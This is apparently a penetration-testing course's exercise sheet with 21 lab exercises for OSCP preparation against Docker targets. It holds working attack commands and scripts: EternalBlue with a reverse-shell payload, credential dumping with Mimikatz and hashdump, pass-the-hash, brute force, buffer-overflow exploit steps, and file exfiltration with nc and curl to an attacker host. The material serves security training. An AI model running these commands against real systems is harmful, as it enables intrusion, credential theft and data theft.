# Practical Tools Exercises

This document contains hands-on exercises to help you practice using the various tools covered in this module. These exercises are designed to simulate real-world scenarios you might encounter during the OSCP exam.

## Information Gathering Exercises

### Exercise 1: Network Scanning with Nmap

**Objective**: Practice different Nmap scanning techniques to gather information about target systems.

**Setup**:
1. Start the Docker environment (instructions in the resources directory)
2. Use the provided target machines with various services running

**Tasks**:
1. Perform a host discovery scan to identify all live hosts in the network
   ```bash
   # Command to use
   nmap -sn 192.168.100.0/24
   ```

2. Perform a comprehensive scan of a target host including service version detection and OS detection
   ```bash
   # Command to use
   nmap -sS -sV -O -p- 192.168.100.10
   ```

3. Use NSE scripts to gather more information about specific services
   ```bash
   # Command to use
   nmap -p 80,443 --script=http-enum,http-headers 192.168.100.10
   ```

4. Create a scan strategy that minimizes noise while still gathering useful information
   ```bash
   # Command to use
   nmap -sS -T2 --top-ports 100 192.168.100.0/24
   ```

5. Document your findings in a structured format that would be useful for reporting

### Exercise 2: DNS Enumeration

**Objective**: Practice DNS enumeration techniques to gather information about a domain.

**Setup**:
1. Use the provided target domain in the Docker environment

**Tasks**:
1. Perform DNS zone transfers to gather information about the domain
   ```bash
   # Command to use
   dig axfr @192.168.100.10 example.com
   ```

2. Use DNSRecon to enumerate subdomains
   ```bash
   # Command to use
   dnsrecon -d example.com -t std
   ```

3. Use Sublist3r to discover subdomains
   ```bash
   # Command to use
   sublist3r -d example.com
   ```

4. Create a comprehensive list of all discovered subdomains and their IP addresses

### Exercise 3: OSINT Gathering

**Objective**: Practice Open Source Intelligence (OSINT) gathering techniques.

**Tasks**:
1. Use theHarvester to gather email addresses and subdomains for a target organization
   ```bash
   # Command to use
   theHarvester -d example.com -b all
   ```

2. Use Recon-ng to gather information about a target organization
   ```bash
   # Command to use
   recon-ng
   > marketplace search github
   > marketplace install recon/domains-hosts/github_subdomains
   > modules load recon/domains-hosts/github_subdomains
   > options set SOURCE example.com
   > run
   ```

3. Use Google dorks to find sensitive information about a target organization
   ```
   site:example.com filetype:pdf
   site:example.com inurl:admin
   site:example.com intitle:"index of"
   ```

4. Document all findings in a structured format

## Vulnerability Assessment Exercises

### Exercise 4: Web Vulnerability Scanning

**Objective**: Practice using web vulnerability scanners to identify potential vulnerabilities.

**Setup**:
1. Use the provided vulnerable web applications in the Docker environment

**Tasks**:
1. Use Nikto to scan a web server for vulnerabilities
   ```bash
   # Command to use
   nikto -h http://192.168.100.10
   ```

2. Use OWASP ZAP to perform an automated scan of a web application
   ```bash
   # Command to use
   zaproxy -cmd -quickurl http://192.168.100.10 -quickout zap_report.html
   ```

3. Use Burp Suite to manually explore a web application and identify potential vulnerabilities
   - Configure your browser to use Burp Suite as a proxy
   - Navigate through the web application
   - Analyze requests and responses
   - Identify potential vulnerabilities

4. Compare the results from automated and manual testing, noting any differences

### Exercise 5: Network Vulnerability Assessment

**Objective**: Practice using network vulnerability scanners to identify potential vulnerabilities.

**Setup**:
1. Use the provided target machines in the Docker environment

**Tasks**:
1. Use OpenVAS to scan a target network for vulnerabilities
   ```bash
   # Setup and use OpenVAS
   # (Follow instructions in resources directory)
   ```

2. Use Nessus Essentials to scan a target network for vulnerabilities
   ```bash
   # Setup and use Nessus
   # (Follow instructions in resources directory)
   ```

3. Compare the results from both scanners, noting any differences
4. Prioritize the identified vulnerabilities based on their severity and exploitability

### Exercise 6: SMB Enumeration

**Objective**: Practice enumerating SMB services to identify potential vulnerabilities.

**Setup**:
1. Use the provided Windows target in the Docker environment

**Tasks**:
1. Use enum4linux to gather information about the SMB service
   ```bash
   # Command to use
   enum4linux -a 192.168.100.20
   ```

2. Use SMBMap to enumerate SMB shares and permissions
   ```bash
   # Command to use
   smbmap -H 192.168.100.20
   ```

3. Use Nmap scripts to gather information about the SMB service
   ```bash
   # Command to use
   nmap --script=smb-enum-shares,smb-enum-users 192.168.100.20
   ```

4. Document all findings and identify potential attack vectors

## Web Application Testing Exercises

### Exercise 7: Directory Enumeration

**Objective**: Practice using directory enumeration tools to discover hidden content.

**Setup**:
1. Use the provided vulnerable web applications in the Docker environment

**Tasks**:
1. Use Gobuster to discover directories and files
   ```bash
   # Command to use
   gobuster dir -u http://192.168.100.10 -w /usr/share/wordlists/dirb/common.txt
   ```

2. Use Dirbuster to discover directories and files
   ```bash
   # Command to use
   dirb http://192.168.100.10 /usr/share/wordlists/dirb/common.txt
   ```

3. Use Feroxbuster to discover directories and files
   ```bash
   # Command to use
   feroxbuster --url http://192.168.100.10 --wordlist /usr/share/wordlists/dirb/common.txt
   ```

4. Compare the results from each tool, noting any differences
5. Create a site map based on the discovered content

### Exercise 8: SQL Injection

**Objective**: Practice identifying and exploiting SQL injection vulnerabilities.

**Setup**:
1. Use the provided vulnerable web applications in the Docker environment

**Tasks**:
1. Manually identify SQL injection vulnerabilities
   - Test input fields with SQL injection payloads
   - Look for error messages or unexpected behavior
   - Confirm the vulnerability with targeted payloads

2. Use SQLmap to automatically identify and exploit SQL injection vulnerabilities
   ```bash
   # Command to use
   sqlmap -u "http://192.168.100.10/page.php?id=1" --dbs
   ```

3. Extract database information using both manual techniques and SQLmap
   ```bash
   # Command to use
   sqlmap -u "http://192.168.100.10/page.php?id=1" -D database_name --tables
   sqlmap -u "http://192.168.100.10/page.php?id=1" -D database_name -T users --dump
   ```

4. Document the exploitation process and findings

### Exercise 9: Cross-Site Scripting (XSS)

**Objective**: Practice identifying and exploiting XSS vulnerabilities.

**Setup**:
1. Use the provided vulnerable web applications in the Docker environment

**Tasks**:
1. Manually identify reflected XSS vulnerabilities
   - Test input fields with XSS payloads
   - Look for unfiltered output
   - Confirm the vulnerability with targeted payloads

2. Manually identify stored XSS vulnerabilities
   - Submit XSS payloads in forms that store data
   - Check if the payload is executed when viewing the stored data
   - Confirm the vulnerability with targeted payloads

3. Use XSSer to automatically identify XSS vulnerabilities
   ```bash
   # Command to use
   xsser --url "http://192.168.100.10/page.php?id=1"
   ```

4. Create a proof-of-concept exploit for each identified vulnerability
5. Document the exploitation process and findings

## Exploitation Exercises

### Exercise 10: Metasploit Framework

**Objective**: Practice using the Metasploit Framework to exploit vulnerabilities.

**Setup**:
1. Use the provided vulnerable machines in the Docker environment

**Tasks**:
1. Use Metasploit to scan for vulnerabilities
   ```bash
   # Command to use
   msfconsole
   > db_nmap -sS -sV 192.168.100.30
   > search type:exploit name:apache
   ```

2. Exploit a vulnerable service using Metasploit
   ```bash
   # Command to use
   msfconsole
   > use exploit/windows/smb/ms17_010_eternalblue
   > set RHOSTS 192.168.100.30
   > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   > set LHOST 192.168.100.5
   > exploit
   ```

3. Perform post-exploitation activities using Meterpreter
   ```bash
   # Command to use
   > sysinfo
   > getuid
   > hashdump
   > search -f *.txt
   ```

4. Document the exploitation process and findings

### Exercise 11: Manual Exploitation

**Objective**: Practice manually exploiting vulnerabilities without using Metasploit.

**Setup**:
1. Use the provided vulnerable machines in the Docker environment

**Tasks**:
1. Identify a vulnerability using searchsploit
   ```bash
   # Command to use
   searchsploit apache 2.4.49
   ```

2. Download and modify an exploit as needed
   ```bash
   # Command to use
   searchsploit -m 50383
   ```

3. Manually exploit the vulnerability
   - Review and understand the exploit code
   - Modify the exploit as needed
   - Execute the exploit against the target

4. Establish a reverse shell connection
   ```bash
   # Command to use (on attacker machine)
   nc -lvp 4444
   ```

5. Document the exploitation process and findings

### Exercise 12: Buffer Overflow

**Objective**: Practice exploiting a buffer overflow vulnerability.

**Setup**:
1. Use the provided vulnerable application in the Docker environment

**Tasks**:
1. Fuzz the application to identify the vulnerability
   ```python
   # Python script to fuzz the application
   #!/usr/bin/python
   import socket
   
   buffer = "A" * 100
   while len(buffer) <= 4000:
       try:
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           s.connect(("192.168.100.40", 9999))
           s.send(buffer + "\r\n")
           s.close()
           print("Sent buffer of length: {}".format(len(buffer)))
           buffer = buffer + "A" * 100
       except:
           print("Application crashed at buffer length: {}".format(len(buffer)))
           break
   ```

2. Find the exact offset to EIP
   ```bash
   # Command to use
   /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
   # After crash, find the value in EIP and use pattern_offset.rb
   /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438
   ```

3. Control EIP and identify bad characters
   ```python
   # Python script to control EIP and identify bad characters
   #!/usr/bin/python
   import socket
   
   # All possible characters
   badchars = (
       "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
       # ... rest of characters ...
   )
   
   buffer = "A" * 2003 + "B" * 4 + badchars
   
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(("192.168.100.40", 9999))
   s.send(buffer + "\r\n")
   s.close()
   ```

4. Find a JMP ESP instruction
   ```
   # In Immunity Debugger with mona.py
   !mona modules
   !mona find -s "\xff\xe4" -m module.dll
   ```

5. Generate shellcode and create the final exploit
   ```bash
   # Command to use
   msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f python -b "\x00" EXITFUNC=thread
   ```

6. Execute the exploit and obtain a shell
7. Document the exploitation process and findings

## Password Attacks Exercises

### Exercise 13: Password Cracking

**Objective**: Practice cracking password hashes using various tools.

**Setup**:
1. Use the provided password hash files in the resources directory

**Tasks**:
1. Use John the Ripper to crack Linux password hashes
   ```bash
   # Command to use
   john --wordlist=/usr/share/wordlists/rockyou.txt linux_hashes.txt
   ```

2. Use Hashcat to crack Windows NTLM hashes
   ```bash
   # Command to use
   hashcat -m 1000 -a 0 windows_hashes.txt /usr/share/wordlists/rockyou.txt
   ```

3. Use John the Ripper with rules to crack more complex passwords
   ```bash
   # Command to use
   john --wordlist=/usr/share/wordlists/rockyou.txt --rules=Jumbo complex_hashes.txt
   ```

4. Use Hashcat with a mask attack to crack passwords with a known pattern
   ```bash
   # Command to use
   hashcat -m 0 -a 3 pattern_hashes.txt ?u?l?l?l?l?l?d?d
   ```

5. Document the cracking process and success rate

### Exercise 14: Online Password Attacks

**Objective**: Practice performing online password attacks against various services.

**Setup**:
1. Use the provided vulnerable machines in the Docker environment

**Tasks**:
1. Use Hydra to brute force SSH credentials
   ```bash
   # Command to use
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.50 ssh
   ```

2. Use Hydra to brute force HTTP Basic Authentication
   ```bash
   # Command to use
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.50 http-get /admin/
   ```

3. Use Hydra to brute force a web form
   ```bash
   # Command to use
   hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.100.50 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
   ```

4. Use Medusa to brute force FTP credentials
   ```bash
   # Command to use
   medusa -h 192.168.100.50 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
   ```

5. Document the attack process and success rate

## Post-Exploitation Exercises

### Exercise 15: Privilege Escalation

**Objective**: Practice identifying and exploiting privilege escalation vulnerabilities.

**Setup**:
1. Use the provided vulnerable machines in the Docker environment

**Tasks**:
1. Use LinPEAS/WinPEAS to identify privilege escalation vectors
   ```bash
   # Command to use (Linux)
   ./linpeas.sh
   
   # Command to use (Windows)
   .\winPEAS.exe
   ```

2. Manually enumerate the system for privilege escalation vectors
   ```bash
   # Linux commands
   find / -perm -u=s -type f 2>/dev/null
   cat /etc/crontab
   sudo -l
   
   # Windows commands
   whoami /priv
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

3. Exploit identified privilege escalation vectors
   - SUID binaries
   - Weak file permissions
   - Misconfigured services
   - Kernel exploits

4. Document the privilege escalation process and findings

### Exercise 16: Lateral Movement

**Objective**: Practice moving laterally within a network after initial compromise.

**Setup**:
1. Use the provided network of vulnerable machines in the Docker environment

**Tasks**:
1. Use Mimikatz to extract credentials from a compromised Windows system
   ```powershell
   # Command to use
   .\mimikatz.exe
   > privilege::debug
   > sekurlsa::logonpasswords
   ```

2. Use Pass-the-Hash to access other systems
   ```bash
   # Command to use
   pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 //192.168.100.60 cmd.exe
   ```

3. Use CrackMapExec to move laterally
   ```bash
   # Command to use
   crackmapexec smb 192.168.100.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0
   ```

4. Use port forwarding to access internal services
   ```bash
   # Command to use
   ssh -L 8080:192.168.100.70:80 user@192.168.100.60
   ```

5. Document the lateral movement process and findings

### Exercise 17: Data Exfiltration

**Objective**: Practice extracting sensitive data from compromised systems.

**Setup**:
1. Use the provided vulnerable machines in the Docker environment

**Tasks**:
1. Identify and locate sensitive data
   ```bash
   # Linux commands
   find / -name "*.txt" -o -name "*.pdf" -o -name "*.doc" 2>/dev/null
   
   # Windows commands
   dir /s /b *.txt *.pdf *.doc
   ```

2. Use various methods to exfiltrate data
   ```bash
   # Using netcat
   nc -w 3 192.168.100.5 4444 < sensitive_data.txt
   
   # Using HTTP
   curl -F "file=@sensitive_data.txt" http://192.168.100.5:8000/
   
   # Using DNS tunneling
   # (Setup instructions in resources directory)
   ```

3. Use encryption to hide exfiltrated data
   ```bash
   # Command to use
   openssl enc -aes-256-cbc -salt -in sensitive_data.txt -out encrypted_data.txt -k password
   ```

4. Document the data exfiltration process and techniques used

## Custom Tool Development Exercises

### Exercise 18: Automation with Python

**Objective**: Practice developing custom tools for penetration testing.

**Tasks**:
1. Create a Python script to automate port scanning
   ```python
   #!/usr/bin/python3
   import socket
   import sys
   from datetime import datetime
   
   # Define target
   target = sys.argv[1]
   
   # Add banner
   print("-" * 50)
   print("Scanning target: " + target)
   print("Time started: " + str(datetime.now()))
   print("-" * 50)
   
   try:
       # Scan ports
       for port in range(1, 1025):
           s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           socket.setdefaulttimeout(1)
           result = s.connect_ex((target, port))
           if result == 0:
               print(f"Port {port}: Open")
           s.close()
   
   except KeyboardInterrupt:
       print("\nExiting program.")
       sys.exit()
   
   except socket.gaierror:
       print("\nHostname could not be resolved.")
       sys.exit()
   
   except socket.error:
       print("\nServer not responding.")
       sys.exit()
   ```

2. Create a Python script to automate directory enumeration
   ```python
   #!/usr/bin/python3
   import requests
   import sys
   
   # Define target and wordlist
   target = sys.argv[1]
   wordlist = sys.argv[2]
   
   # Add banner
   print("-" * 50)
   print("Enumerating directories on: " + target)
   print("-" * 50)
   
   # Read wordlist
   with open(wordlist, 'r') as f:
       directories = f.read().splitlines()
   
   # Enumerate directories
   for directory in directories:
       url = f"{target}/{directory}"
       response = requests.get(url)
       if response.status_code == 200:
           print(f"[+] Found: {url}")
   ```

3. Create a Python script to automate subdomain enumeration
   ```python
   #!/usr/bin/python3
   import dns.resolver
   import sys
   
   # Define target and wordlist
   target = sys.argv[1]
   wordlist = sys.argv[2]
   
   # Add banner
   print("-" * 50)
   print("Enumerating subdomains on: " + target)
   print("-" * 50)
   
   # Read wordlist
   with open(wordlist, 'r') as f:
       subdomains = f.read().splitlines()
   
   # Enumerate subdomains
   for subdomain in subdomains:
       try:
           domain = f"{subdomain}.{target}"
           answers = dns.resolver.resolve(domain, 'A')
           for answer in answers:
               print(f"[+] Found: {domain} ({answer})")
       except:
           pass
   ```

4. Test your scripts against the provided targets
5. Document the development process and results

### Exercise 19: Bash Scripting for Automation

**Objective**: Practice developing bash scripts for penetration testing.

**Tasks**:
1. Create a bash script to automate initial reconnaissance
   ```bash
   #!/bin/bash
   
   # Check if target is provided
   if [ $# -eq 0 ]; then
       echo "Usage: $0 <target>"
       exit 1
   fi
   
   TARGET=$1
   
   # Create output directory
   mkdir -p recon/$TARGET
   
   # Banner
   echo "Starting reconnaissance on $TARGET"
   echo "=================================="
   
   # Ping sweep
   echo "[+] Performing ping sweep"
   nmap -sn $TARGET -oN recon/$TARGET/ping_sweep.txt
   
   # Port scan
   echo "[+] Performing port scan"
   nmap -sS -sV -p- $TARGET -oN recon/$TARGET/port_scan.txt
   
   # Web enumeration
   echo "[+] Performing web enumeration"
   gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -o recon/$TARGET/gobuster.txt
   
   echo "Reconnaissance completed. Results saved in recon/$TARGET/"
   ```

2. Create a bash script to automate vulnerability scanning
   ```bash
   #!/bin/bash
   
   # Check if target is provided
   if [ $# -eq 0 ]; then
       echo "Usage: $0 <target>"
       exit 1
   fi
   
   TARGET=$1
   
   # Create output directory
   mkdir -p vulnscan/$TARGET
   
   # Banner
   echo "Starting vulnerability scan on $TARGET"
   echo "====================================="
   
   # Nmap vulnerability scan
   echo "[+] Performing Nmap vulnerability scan"
   nmap --script=vuln $TARGET -oN vulnscan/$TARGET/nmap_vuln.txt
   
   # Nikto scan
   echo "[+] Performing Nikto scan"
   nikto -h $TARGET -o vulnscan/$TARGET/nikto.txt
   
   echo "Vulnerability scan completed. Results saved in vulnscan/$TARGET/"
   ```

3. Create a bash script to automate post-exploitation tasks
   ```bash
   #!/bin/bash
   
   # Banner
   echo "Starting post-exploitation tasks"
   echo "==============================="
   
   # System information
   echo "[+] Gathering system information"
   echo "Hostname: $(hostname)"
   echo "Kernel: $(uname -a)"
   echo "OS: $(cat /etc/issue)"
   
   # User information
   echo "[+] Gathering user information"
   echo "Current user: $(whoami)"
   echo "Users with login: $(cat /etc/passwd | grep -v nologin | grep -v false)"
   echo "Sudo users: $(grep -v '^#' /etc/sudoers | grep -v '^$')"
   
   # Network information
   echo "[+] Gathering network information"
   echo "Interfaces: $(ifconfig | grep -E '^[a-z]' | awk '{print $1}')"
   echo "Listening ports: $(netstat -tuln)"
   
   # Sensitive files
   echo "[+] Looking for sensitive files"
   echo "SSH keys: $(find / -name id_rsa 2>/dev/null)"
   echo "Config files: $(find / -name *.conf 2>/dev/null | head -10)"
   
   echo "Post-exploitation tasks completed."
   ```

4. Test your scripts against the provided targets
5. Document the development process and results

## Challenge Exercises

### Exercise 20: Capture the Flag

**Objective**: Apply all the skills learned to complete a capture the flag challenge.

**Setup**:
1. Use the provided CTF environment in the Docker environment

**Tasks**:
1. Perform reconnaissance to identify targets and services
2. Identify vulnerabilities in the discovered services
3. Exploit the vulnerabilities to gain access to the targets
4. Perform post-exploitation to find flags
5. Document your methodology and findings

### Exercise 21: Reporting

**Objective**: Practice creating a professional penetration testing report.

**Tasks**:
1. Create a comprehensive report based on the findings from Exercise 20
2. Include the following sections:
   - Executive Summary
   - Methodology
   - Findings and Vulnerabilities
   - Exploitation Process
   - Recommendations
   - Conclusion
3. Use screenshots and evidence to support your findings
4. Format the report professionally

## Submission Guidelines

For each exercise, submit:
1. A detailed write-up of your methodology
2. Screenshots or evidence of completion
3. Any scripts or tools you developed
4. Answers to any questions posed in the exercise

## Resources

- All necessary tools are available in Kali Linux
- Additional resources and scripts are provided in the resources directory
- Docker environment setup instructions are in the resources directory
